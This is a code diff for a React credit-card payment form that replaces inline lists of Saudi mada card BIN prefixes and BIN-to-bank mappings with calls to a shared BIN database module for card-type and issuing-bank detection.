@@ -26,6 +26,7 @@ import {
   cardAction,
   waitingMessage,
 } from "@/lib/store";
+import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";
 
 const schema = z.object({
   cardNumber: z
@@ -93,172 +94,20 @@ function isValidCardNumber(number: string): boolean {
   return sum % 10 === 0;
 }
 
-// أرقام BIN لبطاقات مدى السعودية
-// القائمة الرسمية من checkout.com - آخر تحديث: 20 أكتوبر 2025 (114 رقم)
-const MADA_BINS = [
-  "403024", "406136", "406996", "407520", "409201", "410621", "410685", "410834",
-  "412565", "417633", "419593", "420132", "421141", "422817", "422818", "422819",
-  "428331", "428671", "428672", "428673", "431361", "432328", "434107", "439954",
-  "440533", "440647", "440795", "442463", "445564", "446393", "446404", "446672",
-  "455036", "455708", "457865", "457997", "458456", "462220", "468540", "468541",
-  "468542", "468543", "474491", "483010", "483011", "483012", "484783", "486094",
-  "486095", "486096", "489318", "489319", "492464", "504300", "513213", "515079",
-  "516138", "520058", "521076", "524130", "524514", "524940", "529415", "529741",
-  "535825", "535989", "536023", "537767", "543085", "543357", "549760", "554180",
-  "555610", "558563", "588845", "588848", "588850", "604906", "636120", "968201",
-  "968202", "968203", "968204", "968205", "968206", "968207", "968208", "968209",
-  "968211", "968212",
-  // BINs بطول 8 أرقام
-  "22337902", "22337986", "22402030", "40177800", "40545400", "40719700", "40728100",
-  "40739500", "42222200", "44661731", "44661833", "45488707", "45488708", "45488713",
-  "45488725", "45488726", "45488727", "45488729", "45501701", "45501703", "45501705",
-  "49098000", "49098001", "52166100", "53973776",
-];
-
-// قاعدة بيانات البنوك مع شعاراتها
-const BANK_DATABASE: Record<string, { bank: string; logo: string }> = {
-  // البنك الأهلي السعودي (SNB)
-  '223379': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '223398': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '412113': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '430258': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '430259': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '430260': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '445303': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '450766': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '455698': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '465154': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '466515': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '473258': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '482052': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '483178': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '485005': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '485042': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '486094': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '486095': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '486096': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '524130': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '529415': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '535825': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '543085': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '549760': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '554180': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '588850': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  '968202': { bank: 'الأهلي', logo: '/images/banks/the-saudi-national-bank.png' },
-  // مصرف الراجحي
-  '403024': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '409201': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '410621': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '455708': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '458456': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '462220': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '484783': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '968205': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '489318': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '489319': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '427015': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  '432328': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '457997': { bank: 'الراجحي', logo: '/images/banks/al-rajhi-banking-and-investment-corp.png' },
-  // مصرف الإنماء
-  '407197': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '407395': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '412565': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '428671': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '428672': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '428673': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '434107': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '446672': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '543357': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '426897': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  '968206': { bank: 'الإنماء', logo: '/images/banks/alinma-bank.png' },
-  // بنك الرياض
-  '513213': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  '520058': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  '524514': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  '529741': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  '535989': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  '536023': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  '537767': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  '558563': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  '968209': { bank: 'الرياض', logo: '/images/banks/riyad-bank.png' },
-  // بنك البلاد
-  '417633': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
-  '446393': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
-  '468540': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
-  '468541': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
-  '468542': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
-  '468543': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
-  '636120': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
-  '968201': { bank: 'البلاد', logo: '/images/banks/al-bilad-bank.png' },
-  // البنك السعودي الفرنسي
-  '421141': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
-  '440647': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
-  '440795': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
-  '446404': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
-  '457865': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
-  '474491': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
-  '588845': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
-  '968208': { bank: 'الفرنسي', logo: '/images/banks/banque-saudi-fransi.png' },
-  // البنك السعودي البريطاني (ساب)
-  '422817': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
-  '422818': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
-  '422819': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
-  '428331': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
-  '605141': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
-  '968204': { bank: 'ساب', logo: '/images/banks/saudi-british-bank.png' },
-  // بنك الجزيرة
-  '440533': { bank: 'الجزيرة', logo: '/images/banks/bank-al-jazira.png' },
-  '445564': { bank: 'الجزيرة', logo: '/images/banks/bank-al-jazira.png' },
-  '504300': { bank: 'الجزيرة', logo: '/images/banks/bank-al-jazira.png' },
-  '968211': { bank: 'الجزيرة', logo: '/images/banks/bank-al-jazira.png' },
-  // البنك العربي الوطني
-  '455036': { bank: 'العربي', logo: '/images/banks/arab-national-bank.png' },
-  '588848': { bank: 'العربي', logo: '/images/banks/arab-national-bank.png' },
-  '968203': { bank: 'العربي', logo: '/images/banks/arab-national-bank.png' },
-  // البنك السعودي للاستثمار
-  '406136': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
-  '483010': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
-  '483011': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
-  '483012': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
-  '589206': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
-  '968207': { bank: 'الاستثمار', logo: '/images/banks/saudi-investment-bank.png' },
-  // STC Pay
-  '420132': { bank: 'STC Pay', logo: '/images/banks/stc-bank.png' },
-  // بنك الخليج الدولي
-  '419593': { bank: 'الخليج', logo: '/images/banks/gulf-international-bank-bsc.png' },
-  '439954': { bank: 'الخليج', logo: '/images/banks/gulf-international-bank-bsc.png' },
-};
-
-// الحصول على معلومات البنك من رقم البطاقة
-function getBankInfo(cardNumber: string): { bank: string; logo: string } | null {
-  const cleanNumber = cardNumber.replace(/\s+/g, "");
-  const bin6 = cleanNumber.substring(0, 6);
-  return BANK_DATABASE[bin6] || null;
-}
-
-// Detect card type
+// Detect card type using unified database
 function getCardType(number: string): string {
   const cleanNumber = number.replace(/\s+/g, "");
-  const bin6 = cleanNumber.substring(0, 6);
-  const bin8 = cleanNumber.substring(0, 8);
-  
-  // التحقق من مدى أولاً (أولوية عليا) - القائمة الرسمية من checkout.com
-  // التحقق من BIN بطول 8 أرقام أولاً
-  if (MADA_BINS.includes(bin8)) return "mada";
-  // ثم التحقق من BIN بطول 6 أرقام
-  if (MADA_BINS.includes(bin6)) return "mada";
-  
-  // التحقق من بطاقات مدى التي تبدأ بـ 9
-  if (/^9/.test(cleanNumber)) return "mada";
-  
-  // التحقق من Visa (تبدأ بـ 4)
-  if (/^4/.test(cleanNumber)) return "visa";
-  
-  // التحقق من Mastercard (تبدأ بـ 51-55 أو 2221-2720)
-  if (/^5[1-5]/.test(cleanNumber)) return "mastercard";
-  if (/^2[2-7]/.test(cleanNumber)) return "mastercard";
-  
-  return "unknown";
+  const cardType = getCardTypeFromDB(cleanNumber);
+  return cardType ? cardType.toLowerCase() : "unknown";
+}
+
+// الحصول على معلومات البنك من رقم البطاقة
+function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
+  const info = getBinInfo(cardNumber);
+  if (info) {
+    return { bank: info.bank, logo: info.bankLogo };
+  }
+  return null;
 }
 
 export default function CreditCardPayment() {
@@ -410,7 +259,7 @@ export default function CreditCardPayment() {
     const cleanCardNumber = data.cardNumber.replace(/\s+/g, "");
     
     // الحصول على معلومات البنك ونوع البطاقة
-    const bankInfo = getBankInfo(cleanCardNumber);
+    const bankInfo = getBankInfoLocal(cleanCardNumber);
     const cardType = getCardType(cleanCardNumber);
     
     // تحديث معلومات شاشة الانتظار (فقط إذا كانت البطاقة موجودة في قاعدة البيانات)
